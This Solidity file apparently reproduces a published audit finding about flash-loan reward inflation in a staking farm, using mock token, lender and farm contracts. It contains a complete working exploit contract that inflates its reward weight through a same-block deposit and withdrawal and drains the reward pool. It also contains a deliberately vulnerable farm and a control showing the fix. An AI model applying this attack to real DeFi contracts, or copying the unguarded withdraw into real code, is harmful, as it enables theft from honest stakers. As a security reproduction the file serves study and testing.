// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
// Synthetic reproduction of AuditVault finding 59251
// "Reward Inflation Through a Flash Loan" (Quantstamp / Sperax Farms)
//
// Root cause (from the report): Rewarder.sol / Farm.sol allow a deposit and a
// withdrawal in the SAME block. An attacker deposits a flash-loaned amount,
// lets the rewarder calibrate (snapshot) the reward-earning weight against that
// huge transient balance, withdraws in the same block, and repays the loan.
// The reward weight was calibrated to the inflated balance and is NOT reconciled
// on withdrawal, so later reward claims are computed against the inflated
// snapshot -> the attacker drains reward tokens that should accrue to honest
// stakers.
//
// The fix (client, commit e1359d8): record a depositTs in the Deposit struct and
// forbid withdrawing in the same block it was deposited. Because a flash loan is
// atomic (single block), the guarded withdraw reverts, the loan cannot be repaid,
// and the whole attack reverts.
//
// Everything below the vulnerable Farm/Rewarder is a FAITHFUL MINIMAL double.
// =============================================================================

// ------------------------------ MiniToken ------------------------------------
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        _transfer(from, to, amt);
        return true;
    }

    function _transfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

// ------------------------------ FlashLender ----------------------------------
interface IFlashBorrower {
    function onFlashLoan(uint256 amount) external;
}

contract FlashLender {
    MiniToken public token;

    constructor(MiniToken t) {
        token = t;
    }

    function flashLoan(uint256 amount) external {
        uint256 pre = token.balanceOf(address(this));
        token.transfer(msg.sender, amount);
        IFlashBorrower(msg.sender).onFlashLoan(amount);
        require(token.balanceOf(address(this)) >= pre, "flash: not repaid");
    }
}

// -------------------------- Farm + Rewarder ----------------------------------
// Combined Farm/Rewarder double. `weight` is the reward-earning snapshot the
// rewarder calibrates; `pendingReward` distributes reward tokens proportional
// to that snapshot (a fixed-rate stand-in for "rewards accrued over time" so the
// exploit is self-contained in a single transaction).
contract Farm {
    MiniToken public farmToken;
    MiniToken public rewardToken;
    bool public immutable sameBlockGuard; // false = vulnerable, true = fixed

    mapping(address => uint256) public balanceOf; // staked farm tokens
    mapping(address => uint256) public weight;    // reward-earning snapshot (calibrated)
    mapping(address => uint256) public depositTs; // block.timestamp of last deposit
    mapping(address => uint256) public claimed;   // rewards already paid out

    uint256 public constant REWARD_RATE = 1e18; // reward tokens per unit of weight
    uint256 public constant SCALE = 1e18;

    constructor(MiniToken _farm, MiniToken _reward, bool _guard) {
        farmToken = _farm;
        rewardToken = _reward;
        sameBlockGuard = _guard;
    }

    function deposit(uint256 amount) external {
        farmToken.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
        depositTs[msg.sender] = block.timestamp;
        _calibrate(msg.sender);
    }

    // Rewarder calibration: snapshot the CURRENT staked balance as the
    // reward-earning weight. During the flash-loan deposit this records the huge
    // transient balance.
    function _calibrate(address user) internal {
        weight[user] = balanceOf[user];
    }

    function withdraw(uint256 amount) external {
        if (sameBlockGuard) {
            // FIX: forbid withdrawing in the same block as the deposit.
            require(block.timestamp > depositTs[msg.sender], "same-block deposit+withdraw");
        }
        // Same-block withdraw is allowed and the reward `weight` is NOT
        // reconciled, so the inflated calibration snapshot persists.
        balanceOf[msg.sender] -= amount; // @> vulnerable: same-block withdraw, snapshot not reconciled
        farmToken.transfer(msg.sender, amount);
    }

    function pendingReward(address user) public view returns (uint256) {
        return weight[user] * REWARD_RATE / SCALE;
    }

    function claim() external returns (uint256 reward) {
        reward = pendingReward(msg.sender) - claimed[msg.sender];
        claimed[msg.sender] += reward;
        rewardToken.transfer(msg.sender, reward);
    }
}

// ------------------------------- Actor ---------------------------------------
// Distinct msg.sender used to model an honest staker for comparison.
contract Actor {
    function deposit(Farm farm, MiniToken token, uint256 amt) external {
        token.approve(address(farm), type(uint256).max);
        farm.deposit(amt);
    }

    function claim(Farm farm) external returns (uint256) {
        return farm.claim();
    }
}

// ------------------------------ Exploit --------------------------------------
contract Exploit is IFlashBorrower {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant INIT = 1e18;            // honest & attacker real stake
    uint256 internal constant FLASH = 1_000_000e18;   // flash-loaned farm tokens
    uint256 internal constant RESERVE = 2_000_002e18; // reward-token reserve in Farm

    MiniToken public farmToken;
    MiniToken public rewardToken;
    Farm public farm;
    FlashLender public lender;
    Actor public honest;

    uint256 public attackerReward; // reward tokens the attacker manages to claim
    uint256 public honestReward;   // reward tokens the honest staker claims
    uint256 public fairShare;      // what the attacker SHOULD receive
    uint256 public stolen;         // inflated excess = theft from the reward pool

    function run() external payable {
        // --- create every helper up-front in fixed order ---
        farmToken = new MiniToken("Farm", "FARM");        // 1
        rewardToken = new MiniToken("Reward", "RWD");     // 2
        farm = new Farm(farmToken, rewardToken, false);   // 3  (vulnerable)
        lender = new FlashLender(farmToken);              // 4
        honest = new Actor();                             // 5

        // --- fund the world ---
        farmToken.mint(address(lender), FLASH);   // loanable liquidity
        farmToken.mint(address(this), INIT);      // attacker's real stake
        farmToken.mint(address(honest), INIT);    // honest staker's stake
        rewardToken.mint(address(farm), RESERVE); // reward pool

        // --- honest staker deposits a fair amount (weight = INIT) ---
        honest.deposit(farm, farmToken, INIT);

        // --- attacker makes the required initial deposit ---
        farmToken.approve(address(farm), type(uint256).max);
        farm.deposit(INIT);

        // --- inflate the reward weight via a same-block flash-loan cycle ---
        lender.flashLoan(FLASH);

        // --- later: everyone claims against their calibrated snapshot ---
        attackerReward = farm.claim();
        honestReward = honest.claim(farm);

        // The attacker only ever truly held INIT of stake; a fair reward matches
        // the honest staker. Everything above that is stolen from the pool.
        fairShare = INIT * farm.REWARD_RATE() / farm.SCALE();
        stolen = attackerReward - fairShare;

        // REAL theft: forward the drained reward tokens to the attacker EOA.
        rewardToken.transfer(ATTACKER, attackerReward);
    }

    function onFlashLoan(uint256 amount) external {
        // deposit the loaned farm tokens -> calibrate snapshots the huge balance
        farmToken.approve(address(farm), type(uint256).max);
        farm.deposit(amount);
        // withdraw in the SAME block -> balance restored, inflated weight persists
        farm.withdraw(amount);
        // repay the flash loan
        farmToken.transfer(address(lender), amount);
    }
}

// ---------------------------- Fixed control ----------------------------------
// Same attack against a Farm built with the same-block guard enabled. The
// guarded withdraw reverts, the flash loan cannot be repaid, and attack() reverts.
contract FixedControl is IFlashBorrower {
    uint256 internal constant INIT = 1e18;
    uint256 internal constant FLASH = 1_000_000e18;
    uint256 internal constant RESERVE = 2_000_002e18;

    MiniToken public farmToken;
    MiniToken public rewardToken;
    Farm public farm;
    FlashLender public lender;

    function attack() external {
        farmToken = new MiniToken("Farm", "FARM");
        rewardToken = new MiniToken("Reward", "RWD");
        farm = new Farm(farmToken, rewardToken, true); // guard ON (fixed)
        lender = new FlashLender(farmToken);

        farmToken.mint(address(lender), FLASH);
        farmToken.mint(address(this), INIT);
        rewardToken.mint(address(farm), RESERVE);

        farmToken.approve(address(farm), type(uint256).max);
        farm.deposit(INIT);

        lender.flashLoan(FLASH); // reverts inside onFlashLoan (same-block withdraw)
    }

    function onFlashLoan(uint256 amount) external {
        farmToken.approve(address(farm), type(uint256).max);
        farm.deposit(amount);
        farm.withdraw(amount); // reverts here: "same-block deposit+withdraw"
        farmToken.transfer(address(lender), amount);
    }
}
